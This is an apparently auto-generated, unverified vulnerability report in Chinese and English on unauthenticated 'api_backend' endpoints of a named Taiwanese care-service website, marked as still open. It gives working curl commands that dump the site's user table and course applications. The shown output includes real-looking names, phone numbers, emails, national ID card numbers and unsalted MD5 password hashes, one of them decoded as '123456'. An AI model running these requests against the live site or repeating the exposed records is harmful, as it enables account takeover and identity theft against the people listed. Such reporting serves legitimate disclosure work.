# POC/EXP — ltc.tzuchi.org.tw LongtermCareService api_backend exposes full user table 

> 漏洞ID: `4eaeddf6-3ae8-4cd8-900a-b03db2e6bc88`  | 嚴重度: **critical** | 狀態: open | 目標: `https://ltc.tzuchi.org.tw/LongtermCareService/api_backend/queryIDNumber and /queryCourseApplicationList`

**類型**: Broken Access Control / Mass Data Exposure (Unauthenticated PII + Credential Leak)

## 描述

ltc.tzuchi.org.tw LongtermCareService backend exposes multiple api_backend/* endpoints that return sensitive data with NO authentication (a bare POST with empty JSON body `{}` is sufficient, no session/token). The most severe:
1. /LongtermCareService/api_backend/queryIDNumber — dumps the FULL user account table (2132 records) including: userCode (login IDs), userPw (MD5 password hashes), userName (real names), email, cphoneNo/tphoneNo (phone numbers), address, birthday.
2. /LongtermCareService/api_backend/queryCourseApplicationList — dumps course applications (38 records) including real names, phone numbers, and TAIWANESE NATIONAL ID CARD NUMBERS (idCard, e.g. m220658121, B221233683), plus email.
Additional unauthenticated endpoints: queryAbout, queryAllList, queryNewsList, queryDictionaryList, queryPostList, queryFriendlyLinkList, queryCourseList, queryDaytimecare, queryCarelocation, queryHomeservice, saveServiceApplication.
The password hashes are unsalted MD5; 471 of 2132 users use "123456" (MD5 e10adc3949ba59abbe56e057f20f883e), 195 use b4af804009cb036a4ccdc33431ef9ac9, 132 use 80da5d337bf9606dd59f3480a125201e, 131 use 6a9edcb7b63821802aa44d35d531c9fc.

## POC / 復現步驟

```
$ curl -s -X POST "https://ltc.tzuchi.org.tw/LongtermCareService/api_backend/queryIDNumber" -H "Content-Type: application/json" -d '{}'
{"res":1,"resCode":2,"data":[{"userId":2,"userCode":"jimmy3","userType":"1","userPw":"e10adc3949ba59abbe56e057f20f883e","userName":"蕭明進","cphoneNo":"0921614909","tphoneNo":"0921614909","email":"jimmy@sourcecode.tw","userEnable":99,"addressCode":"235","address":"中正路736號8樓之8 (原碼數位科技)","birthday":"2018/01/01"},...]}  (2132 records, grep '"userId":' = 2132)

$ curl -s -X POST "https://ltc.tzuchi.org.tw/LongtermCareService/api_backend/queryCourseApplicationList" -H "Content-Type: application/json" -d '{}'
{"res":1,"resCode":2,"data":[{"courseApplicationId":"187","name":"莊靜芬","phone":"0958185246","idCard":"m220658121","email":"m5333001@yahoo.com","applicationStatus":"0"}...]}  (38 records, grep '"courseApplicationId":' = 38)

Distinct password hashes (top): e10adc3949ba59abbe56e057f20f883e ×471 (=MD5 "123456"), b4af804009cb036a4ccdc33431ef9ac9 ×195, 80da5d337bf9606dd59f3480a125201e ×132, 6a9edcb7b63821802aa44d35d531c9fc ×131. No auth header/cookie required.
```

---

## 驗證要點

- [ ] 僅在授權範圍內驗證
- [ ] 最小化請求逐步驗證,留存原始請求/回應
- [ ] 失敗需記錄負結果,避免誤報
- [ ] 未實際驗證前狀態不得改為 confirmed

> 本文件由 JySecAI 自動生成,狀態:**草稿(未驗證)**
